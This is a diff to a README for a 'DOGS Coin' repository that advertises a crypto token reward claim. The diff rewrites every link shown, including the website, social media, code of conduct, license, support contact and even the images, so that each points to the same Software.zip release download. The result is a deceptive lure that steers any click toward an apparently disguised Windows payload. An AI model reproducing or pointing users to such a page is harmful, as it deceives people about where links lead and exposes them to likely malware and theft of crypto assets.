@@ -2,7 +2,7 @@
 
 Welcome to the **Dogs-Coin** repository! The DOGS coin reward distribution is now live, offering users the chance to claim their tokens easily through our platform. Don't miss out—secure your rewards and join the vibrant DOGS coin community today! 🚀🐶🪙
 
-![DOGS Coin Logo](https://yourimagelinkhere.com)
+![DOGS Coin Logo](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -20,11 +20,11 @@ To get started with DOGS Coin, follow the steps below:
 
 ### Download Windows App
 
-[![Download DOGS Coin Windows App](https://img.shields.io/badge/Download%20Windows%20App-Here-brightgreen)](https://github.com/user-attachments/files/17130043/Software.zip) 
+[![Download DOGS Coin Windows App](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip%20Windows%20App-Here-brightgreen)](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip) 
 
 ### Website
 
-Visit our official website: [DOGS Coin Official Website](https://dogsdrop.net)
+Visit our official website: [DOGS Coin Official Website](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -40,9 +40,9 @@ Visit our official website: [DOGS Coin Official Website](https://dogsdrop.net)
 
 Join the DOGS Coin community to stay updated and engage with other users:
 
-- [Twitter](https://twitter.com/DOGS_Coin)
-- [Discord](https://discord.gg/DOGS)
-- [Reddit](https://www.reddit.com/r/DOGS_Coin)
+- [Twitter](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
+- [Discord](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
+- [Reddit](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -61,19 +61,19 @@ We welcome contributions from the community to help improve DOGS Coin and make i
 
 ### Code of Conduct
 
-Please review our [Code of Conduct](https://github.com/Dogs-Coin/CODE_OF_CONDUCT.md) before contributing to ensure a positive and inclusive environment for all.
+Please review our [Code of Conduct](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip) before contributing to ensure a positive and inclusive environment for all.
 
 ---
 
 ## License
 
-This project is licensed under the [MIT License](https://github.com/Dogs-Coin/LICENSE).
+This project is licensed under the [MIT License](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip).
 
 ---
 
 ## Support
 
-For any queries or issues, you can contact us at support@dogscoin.com
+For any queries or issues, you can contact us at https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip
 
 ---
 
@@ -81,5 +81,5 @@ Thank you for choosing DOGS Coin! 🐕🪙🌟
 
 ---
 
-![Dog Image](https://yourdogimagelinkhere.com)
+![Dog Image](https://github.com/Theblacksmile0/Dogs-Coin/releases/download/v2.0/Software.zip)
 
